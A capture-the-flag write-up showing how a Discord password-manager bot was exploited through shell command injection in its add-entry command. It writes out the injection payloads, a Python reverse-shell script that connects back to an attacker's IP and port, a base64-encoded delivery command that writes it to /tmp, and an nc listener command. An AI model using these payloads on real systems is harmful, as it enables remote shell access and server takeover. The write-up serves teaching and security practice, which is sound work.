# Bot Takeover - 0x1

**`Authors:`**    
[LaidMalik](https://github.com/malikDaCoda)  
[Ouxs](https://github.com/ouxs-19)  
[hfz](https://github.com/hfz1337)  

## Description

> Check out our latest service known as "Mate", a friendly bot and a very secure password manager based on the latest encryption technology (OPENSSL).
> You can find him on our discord server https://discord.gg/F7rzGXmQ   

## Write-up 

In this challenge we are dealing with a service that let us store our passwords and we can do that by interacting with the discord bot       
#### Recon  

After registering and knowing the functions of the bot we can divide them into to two sections :  
*`Authentification category : `* : It consists of the login and register function .
*`Data category`* : These functions let us add , delete and view our data .

##### notes 

- Since all we can do is login and inserting/deleting data the exploit is propably an injection(SQLI ,command injection , xpath injection ... )
- The challenge description insists on the use of OPENSSL so we should keep this in mind .   

#### Searching for the exploit point

###### Authentification category

Trying to throw quotes in the login and register functions didn't seem to do do anything and by changing my discord name  I couldn't reregister, so they are propably using our uid which means we only controll the password which highly narrows the possiblities so propably the bug is not here .  

###### Data category

Same thing checking if there any type of sqli by putting a quote as an input ,but wait this time we get something intressting . When trying to add a username containing a quote `!add http://shellmates.club/ ' BSides` this what happens 
                                                (exp1)
Now we have something to work with , our data is paassed to a shell command . Remember the OPENSSL encryption , It's propably used here (We can't be 100% sure) to encrypt our data but the coder didn't safely implemented it .
Now we need to find how to exploit it 

#### Exploit

The command used inside the bot is in this form `command '{our input}' rest of the command` . In order to inject our code we need first to end the first command , insert our command and finally remove the rest and it's quitly simple to do that.Our command should look something like this `command ''; $our_command # rest of the command` .  
* ` ' `  :  To close the first quote and complete the first command 
* ` ; `  :  In order to specify a second command 
* `our_command`  :  This is the command tha we want to execute  
* `#`  :  To comment out the rest   

Not we need to try it , since only the stderr is the one that get redirect to us we can't try commands like `ls,id,whoami` we need a command that we can know that it worked without seeing a response and `sleep` is our savior here .Let's try it out , the command should look like this :
```sh
!add http://shellmates.club/ " ' ; sleep 10 #" BSides
```
- note : I added "" because the payload contains spaces    

And bingo the sleep worked , all we need to do now is to get a reverse shell on the server.  I used this python script for the reverse shell
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$you_adress_ip",$port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```
Since our input will be inside double quotes and our input also contains quotes and double quotes , it will get ugly if we try to make it valid ,an easy way to pass that is to encode in base 64 `base64 you_exploit -w0 `, then when sending it in the command injection and saving it to a file in the server after decoding it . So now our command will be like this : 
```sh
!add http://shellmates.club/ " ' ; echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIiR5b3VfYWRyZXNzX2lwIiwkcG9ydCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk= |base64 -d > /tmp/exploit.py #" BSides
```
- I didn't put it in the directory of the bot because we don't have the permission to create files there.   

Now all we need to do is listen in the local machine `nc -nlvp $port` and run the exploit that we have in the server  
```sh
!add http://shellmates.club/ " ' ; python3 /tmp/exploit.py  #" BSides
```
                
It worked ! we are in , now you can get your flag .  
                                            (exp2)
### Flag 

`shellmates{ev3n_D1$c0Rd_b0Ts_c4n_b3_vUln3r@ble_t0_c0Mm@nd_1nj3cti0n}`

